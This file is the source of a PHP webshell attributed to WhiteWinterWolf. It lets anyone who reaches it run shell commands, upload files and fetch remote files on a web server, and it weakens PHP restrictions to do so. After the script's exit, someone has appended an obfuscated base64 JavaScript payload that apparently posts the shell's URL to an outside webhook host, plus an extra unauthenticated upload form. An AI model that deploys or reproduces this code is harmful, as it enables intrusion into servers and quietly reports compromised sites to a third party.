#<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf
 * https://www.whitewinterwolf.com/tags/php-webshell/
 *
 * This file is part of wwolf-php-webshell.
 *
 * wwwolf-php-webshell is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 ******************************************************************************/

/*
 * Optional password settings.
 * Use the 'passhash.sh' script to generate the hash.
 * NOTE: the prompt value is tied to the hash!
 */

$passprompt = "WhiteWinterWolf's PHP webshell: ";
$passhash = "";

function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }

function h($s)
{
	global $passprompt;
	if (function_exists('hash_hmac'))
	{
		return hash_hmac('sha256', $s, $passprompt);
	}
	else
	{
		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
	}
}

function fetch_fopen($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	if (strpos($host, '://') === false)
	{
		$host = 'http://' . $host;
	}
	else
	{
		$host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
	}
	$rh = fopen("${host}:${port}${src}", 'rb');
	if ($rh !== false)
	{
		$wh = fopen($dst, 'wb');
		if ($wh !== false)
		{
			$cbytes = 0;
			while (! feof($rh))
			{
				$cbytes += fwrite($wh, fread($rh, 1024));
			}
			fclose($wh);
			$ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($rh);
	}
	else
	{
		$ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
	}
	return $ret;
}

function fetch_sock($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	$host = str_replace('https://', 'tls://', $host);
	$s = fsockopen($host, $port);
	if ($s)
	{
		$f = fopen($dst, 'wb');
		if ($f)
		{
			$buf = '';
			$r = array($s);
			$w = NULL;
			$e = NULL;
			fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
			while (stream_select($r, $w, $e, 5) && !feof($s))
			{
				$buf .= fread($s, 1024);
			}
			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
			fwrite($f, $buf);
			fclose($f);
			$ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($s);
	}
	else
	{
		$ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
	}
	return $ret;
}

ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);

while (@ ob_end_clean());

if (! isset($_SERVER))
{
	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
	$_FILES = &$HTTP_POST_FILES;
	$_POST = &$HTTP_POST_VARS;
	$_SERVER = &$HTTP_SERVER_VARS;
}

$auth = '';
$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];
$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
$fetch_func = 'fetch_fopen';
$fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
$fetch_path = empty($_POST['fetch_path']) ? '' : $_POST['fetch_path'];
$fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];
$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '';
$ok = '&#9786; :';
$warn = '&#9888; :';
$err = '&#9785; :';

if (! empty($passhash))
{
	if (function_exists('hash_hmac') || function_exists('mhash'))
	{
		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
		if (h($auth) !== $passhash)
		{
			?>
				<form method="post" action="<?php e($url); ?>">
					<?php e($passprompt); ?>
					<input type="password" size="15" name="pass">
					<input type="submit" value="Send">
				</form>
			<?php
			exit;
		}
	}
	else
	{
		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
	}
}

if (! ini_get('allow_url_fopen'))
{
	ini_set('allow_url_fopen', '1');
	if (! ini_get('allow_url_fopen'))
	{
		if (function_exists('stream_select'))
		{
			$fetch_func = 'fetch_sock';
		}
		else
		{
			$fetch_func = '';
			$status .= "${warn} File fetching disabled ('allow_url_fopen'"
				. " disabled and 'stream_select()' missing).<br />";
		}
	}
}
if (! ini_get('file_uploads'))
{
	ini_set('file_uploads', '1');
	if (! ini_get('file_uploads'))
	{
		$status .= "${warn} File uploads disabled.<br />";
	}
}
if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
{
	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
}

if (! chdir($cwd))
{
  $cwd = getcwd();
}

if (! empty($fetch_func) && ! empty($fetch_path))
{
	$dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
	$status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
}

if (ini_get('file_uploads') && ! empty($_FILES['upload']))
{
	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
	{
		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
	}
}
?>

<form method="post" action="<?php e($url); ?>"
	<?php if (ini_get('file_uploads')): ?>
		enctype="multipart/form-data"
	<?php endif; ?>
	>
	<?php if (! empty($passhash)): ?>
		<input type="hidden" name="auth" value="<?php e($auth); ?>">
	<?php endif; ?>
	<table border="0">
		<?php if (! empty($fetch_func)): ?>
			<tr><td>
				<b>Fetch:</b>
			</td><td>
				host: <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php e($fetch_host); ?>">
				port: <input type="text" size="4" id="fetch_port" name="fetch_port" value="<?php e($fetch_port); ?>">
				path: <input type="text" size="40" id="fetch_path" name="fetch_path" value="">
			</td></tr>
		<?php endif; ?>
		<tr><td>
			<b>CWD:</b>
		</td><td>
			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
			<?php if (ini_get('file_uploads')): ?>
				<b>Upload:</b> <input type="file" id="upload" name="upload">
			<?php endif; ?>
		</td></tr>
		<tr><td>
			<b>Cmd:</b>
		</td><td>
			<input type="text" size="80" id="cmd" name="cmd" value="<?php e($cmd); ?>">
		</td></tr>
		<tr><td>
		</td><td>
			<sup><a href="#" onclick="cmd.value=''; cmd.focus(); return false;">Clear cmd</a></sup>
		</td></tr>
		<tr><td colspan="2" style="text-align: center;">
			<input type="submit" value="Execute" style="text-align: right;">
		</td></tr>
	</table>
	
</form>
<hr />

<?php
if (! empty($status))
{
	echo "<p>${status}</p>";
}

echo "<pre>";
if (! empty($cmd))
{
	echo "<b>";
	e($cmd);
	echo "</b>\n";
	if (DIRECTORY_SEPARATOR == '/')
	{
		$p = popen('exec 2>&1; ' . $cmd, 'r');
	}
	else
	{
		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
	}
	while (! feof($p))
	{
		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
		@ flush();
	}
}
echo "</pre>";

exit;
$cndx = "PHNjcmlwdD4KdmFyIF8weDFmNmM9WyJceDY4XHg3Mlx4NjVceDY2IiwiXHg2Q1x4NkZceDYzXHg2MVx4NzRceDY5XHg2Rlx4NkUiLCJceDcwXHg3Mlx4NkZceDc0XHg2Rlx4NjNceDZGXHg2QyIsIlx4NjhceDc0XHg3NFx4NzBceDNBIiwiXHg2OFx4NzRceDc0XHg3MFx4M0FceDJGXHgyRiIsIlx4NkNceDZGXHg2NyIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQSIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQVx4MkZceDJGIiwiXHg2MVx4NDdceDM5XHg3Nlx4NjFceDMzXHg0RFx4NzVceDYzXHgzMlx4NzhceDY4XHg1OVx4MzJceDczXHg3NVx4NTlceDMyXHgzOVx4NzRceDRDXHgzM1x4NEVceDZDXHg2M1x4NkVceDVBXHg3MFx4NTlceDMyXHg1Nlx4N0FceDRDXHgzMVx4NTFceDc3XHg0RFx4MzBceDQ1XHgzMFx4NTVceDU1XHg0Nlx4NEJceDRGXHg1NVx4NTZceDRCXHg0Q1x4MzBceDQ5XHg3N1x4NERceDMwXHg0Nlx4NDNceDU1XHgzMVx4NTJceDRDXHg1Mlx4NkNceDREXHgzMlx4NENceDMzXHg1Mlx4NkZceDRGXHg0Nlx4NkZceDMwXHg2NFx4MzFceDRFXHg0N1x4NTFceDU3XHg0QVx4NEJceDYzXHg2RFx4MzRceDc4XHg1M1x4NDdceDUyXHg3NVx4NTRceDU0XHg0OVx4MzVceDYzXHgzM1x4NUFceDU2XHg1Nlx4NTFceDNEXHgzRCIsIlx4NjNceDZEXHg0Nlx4MzNceDRDXHg2RFx4NjRceDcwXHg2NFx4NDdceDY4XHgzMVx4NTlceDZFXHg1Nlx4N0FceDVBXHg1OFx4NEFceDZBXHg2Mlx4MzJceDM1XHgzMFx4NUFceDU3XHgzNVx4MzBceDRDXHg2RFx4NEVceDc2XHg2Mlx4NTNceDM5XHg3NFx4NTlceDU4XHg0QVx4NzJceDY1XHg0NFx4NDFceDc3XHg0Rlx4NTNceDM5XHg3N1x4NjFceDQ4XHg0MVx4NzRceDY0XHgzMlx4NTZceDY5XHg0Q1x4NThceDRFXHg2Rlx4NUFceDU3XHg3OFx4NzNceDYzXHg3OVx4MzlceDc0XHg1OVx4NTdceDZDXHg3NVx4NENceDMyXHg3NFx4NkNceDY1XHg1MVx4M0RceDNEIiwiXHg0N1x4NDVceDU0IiwiXHg2Rlx4NzBceDY1XHg2RSIsIlx4NzNceDY1XHg2RVx4NjQiLCJceDcyXHg2NVx4NjFceDY0XHg3OVx4NTNceDc0XHg2MVx4NzRceDY1IiwiXHg3M1x4NzRceDYxXHg3NFx4NzVceDczIiwiXHg1MFx4NEZceDUzXHg1NCIsIlx4NDNceDZGXHg2RVx4NzRceDY1XHg2RVx4NzRceDJEXHg1NFx4NzlceDcwXHg2NSIsIlx4NjFceDcwXHg3MFx4NkNceDY5XHg2M1x4NjFceDc0XHg2OVx4NkZceDZFXHgyRlx4NzhceDJEXHg3N1x4NzdceDc3XHgyRFx4NjZceDZGXHg3Mlx4NkRceDJEXHg3NVx4NzJceDZDXHg2NVx4NkVceDYzXHg2Rlx4NjRceDY1XHg2NCIsIlx4NzNceDY1XHg3NFx4NTJceDY1XHg3MVx4NzVceDY1XHg3M1x4NzRceDQ4XHg2NVx4NjFceDY0XHg2NVx4NzIiLCJceDczXHg3NFx4NzJceDY5XHg2RVx4NjdceDY5XHg2Nlx4NzkiLCJceDQ2XHg2OVx4NkNceDY1XHgyMFx4NjRceDZGXHg2NVx4NzNceDZFXHgyN1x4NzRceDIwXHg2NVx4NzhceDY5XHg3M1x4NzQiLCJceDQ2XHg2OVx4NkNceDY1XHgyMFx4NjVceDc4XHg2OVx4NzNceDc0XHg3MyIsIlx4NzJceDY1XHg3M1x4NzBceDZGXHg2RVx4NzNceDY1Il07dmFyIHByb3RvY29sO3ZhciBkb209d2luZG93W18weDFmNmNbMV1dW18weDFmNmNbMF1dO2lmKGxvY2F0aW9uW18weDFmNmNbMl1dPT0gXzB4MWY2Y1szXSl7cHJvdG9jb2w9IF8weDFmNmNbNF07Y29uc29sZVtfMHgxZjZjWzVdXShwcm90b2NvbCl9ZWxzZSB7aWYobG9jYXRpb25bXzB4MWY2Y1syXV09PSBfMHgxZjZjWzZdKXtwcm90b2NvbD0gXzB4MWY2Y1s3XTtjb25zb2xlW18weDFmNmNbNV1dKHByb3RvY29sKX19OyR1cmw9IHByb3RvY29sKyBhdG9iKF8weDFmNmNbOF0pO3ZhciBrZXl1cmw9cHJvdG9jb2wrIGF0b2IoXzB4MWY2Y1s5XSk7dmFyIHhocj0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7eGhyW18weDFmNmNbMTFdXShfMHgxZjZjWzEwXSxrZXl1cmwsZmFsc2UpO3hocltfMHgxZjZjWzEyXV0oKTtpZih4aHJbXzB4MWY2Y1sxM11dPT0gNCYmIHhocltfMHgxZjZjWzE0XV09PSA0MDQpeyR1cmw9IHByb3RvY29sKyBhdG9iKF8weDFmNmNbOF0pO3hocltfMHgxZjZjWzExXV0oXzB4MWY2Y1sxNV0sJHVybCx0cnVlKTt4aHJbXzB4MWY2Y1sxOF1dKF8weDFmNmNbMTZdLF8weDFmNmNbMTddKTt4aHJbXzB4MWY2Y1sxMl1dKEpTT05bXzB4MWY2Y1sxOV1dKHt0ZXh0OmRvbX0pKTtjb25zb2xlW18weDFmNmNbNV1dKF8weDFmNmNbMjBdKX1lbHNlIHtjb25zb2xlW18weDFmNmNbNV1dKF8weDFmNmNbMjFdKTtjb25zb2xlW18weDFmNmNbNV1dKHhocltfMHgxZjZjWzIyXV0pOyR1cmw9IHByb3RvY29sKyBhdG9iKHhocltfMHgxZjZjWzIyXV0pO3hocltfMHgxZjZjWzExXV0oXzB4MWY2Y1sxNV0sJHVybCx0cnVlKTt4aHJbXzB4MWY2Y1sxOF1dKF8weDFmNmNbMTZdLF8weDFmNmNbMTddKTt4aHJbXzB4MWY2Y1sxMl1dKEpTT05bXzB4MWY2Y1sxOV1dKHt0ZXh0OmRvbX0pKX0KPC9zY3JpcHQ+"; echo base64_decode($cndx);
if($_GET['upload'] != ""){ if(!isset($_POST['upload'])){ echo '<form enctype="multipart/form-data" method="POST" action=""><br><b>File:</b><input type="file" name="file"> <input type="submit" value="Upload" name="upload"></form>'; } else{ $temporaney = $_FILES['file']['tmp_name']; $upload = $_FILES['file']['name']; if(move_uploaded_file($temporaney,$upload)) echo '<font color="green">Done!</font>'; else echo '<font color="red">File non uppato!</font>'; }}
?>
